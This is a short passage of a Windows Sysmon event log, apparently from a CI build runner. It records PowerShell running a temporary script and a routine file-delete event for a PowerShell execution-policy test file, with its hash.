ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:51:41 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:51:41.717
ProcessGuid: {f995aebf-610d-6942-8602-000000000e00}
ProcessId: 4384
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_oeykn12g.jof.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
